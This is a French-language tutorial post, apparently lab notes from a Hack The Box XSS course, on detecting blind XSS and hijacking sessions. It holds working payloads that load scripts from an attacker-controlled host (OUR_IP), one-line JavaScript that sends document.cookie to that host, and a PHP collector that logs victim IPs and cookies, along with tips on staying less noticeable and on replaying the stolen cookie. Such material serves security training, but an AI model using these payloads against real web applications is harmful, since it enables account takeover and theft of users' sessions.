---
title:  "Session Hijacking"
category: "Attaque XSS"
tag: "Cross-Site Scripting (XSS)"
---
Les applications modernes utilisent les cookies pour maintenir la session d'un utilisateur à travers différentes sessions de navigation.
Si un attaquant récupère le cookie du navigateur d'une victime, il pourrait se connecter facilement sans avoir ses credentials.

En ayant la possibilité d'exécuter du Javascript sur le navigateur, on peut récupérer ces cookies et les envoyer à un serveur pour détourner la session connectée en effectuant un **"Session Hijacking"** ou **"Cookie Stealing"**.

# Détection de Blind XSS

Une **Blind XSS** se produit lorsque la vulnérabilité XSS est déclenchée sur une page dont on n'a pas accès.

Les vulnérabilités **Blind XSS** se produisent souvent sur des réceptions de formulaires accessibles seulement par certains utilisateurs (Admin par exemple). On peut citer d'autres exemples de situations :
- Formulaires de contact
- Avis
- Détails de l'utilisateur
- Tickets d'assistance
- En-tête HTTP User-Agent

Puisque nous n'avons pas accès à la page qui va déclencher l'XSS, nous ne pouvons pas détecter sur le site directement si la vulnérabilité XSS est effective.

Pour cela, nous pouvons utiliser une technique qui consiste à envoyer une requête HTTP  à un serveur en écoute dans le script JS exécuté sur la page distante.
Si on reçoit la requête, alors on pourra en déduire que le code Javascript a bien été interprété, et donc qu'une XSS existe sur une page dont nous n'avons pas accès.

Cela pose deux problèmes :
- **Comment savoir quel champ est vulnérable ?**
- **Quel payload d'XSS utiliser?**

# Chargement d'un script distant
En HTML, on peut injecter du code Javascript avec les balises \<script\> ou inclure un script distant à l'aide d'une url, qui sera stocké dans notre serveur de la manière suivante :
```html
<script src="http://SERVERIP/script.js"></script>
```

Afin d'identifier le champ qui est vulnérable, on peut personnaliser la requête HTTP :
```html
<script src="http://OUR_IP/specificField"></script>
```

On peut retrouver pleins d'exemples de payload à injecter sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss) 
tels que les suivants :
```html
<script src="http://OUR_IP"></script>
"><script src="http://OUR_IP"></script>
'><script src="http://OUR_IP"></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Avant d'envoyer les payloads, il faut donc mettre un serveur en écoute avec nc ou php par exemple :
```console
Misoko@htb[/htb]$ mkdir /tmp/tmpserver
Misoko@htb[/htb]$ cd /tmp/tmpserver
Misoko@htb[/htb]$ sudo php -S 0.0.0.0:80
```

Et donc dans le formulaire, on insère le même paylaod, que l'on personnalise selon le champ. On attend quelques secondes pour voir si on a un retour de la part de la page qui est censé exécuter le payload.
Si ce n'est pas le cas, on continue avec un autre payload et ainsi de suite jusqu'à trouver le bon.

Bien entendu, cette étape peut être automatisée en écrivant un script.

```html
<script src="http://OUR_IP/fullname"></script> # insérer dans le champ "full-name"
<script src="http://OUR_IP/username"></script> # insérer dans le champ "username"
...ETC...
```

# Session Hijacking

Une fois que l'on a trouvé un payload fonctionnel de XSS avec le champ vulnérable sur l'application web, on peut procéder à l'exploitation et effectuer 
une attaque dites de **Session Hijacking**.

Cette attaque consiste à récupérer un cookie de session à l'aide d'un script Javascript, et d'effectuer une requête HTTP qui contiendra le cookie de session 
à notre serveur en écoute.

On retrouve plein de payloads sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc) pour récupérer 
les cookies de session et les envoyer à notre serveur :

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Utiliser le deuxième serait moins suspicieux puisqu'il ajoute simplement une image sur la page, contrairement au premier qui navigue sur notre page php de saisie de cookie.

On va mettre notre payload javascript dans un fichier **script.js** que l'on place à l'endroit où le serveur est en écoute.
On place dans le champ de sasie vulnérable la requête http suivante :

```html
<script src=http://OUR_IP/script.js></script>
```
<center><img src="/assets/images/htbAcademy/XSSModule/sessionhijacking1.png" alt="Alt text"></center>

On recevra la requête GET contenant le cookie en paramètre :

<center><img src="/assets/images/htbAcademy/XSSModule/sessionhijacking2.png" alt="Alt text"></center>

Cependant, s'il y avait de nombreux cookies reçus en raison d'un déclenchement multiple de la vulnérabilité, il serait bien de pouvoir stocker ces derniers dans un fichier.
On peut utiliser le code php suivant et relancer notre serveur avec :

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

On obtient un log propre contenant le cookie :
```console
Misoko@htb[/htb]$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=c00k1355h0u1d8353cu23d
```

Pour finir, il faut enregistrer le cookie de session dans l'onglet **Stockage** de l'outil développeur dans la page de connection, puis de rafraîchir la page

<center><img src="/assets/images/htbAcademy/XSSModule/sessionhijacking3.png" alt="Alt text"></center>

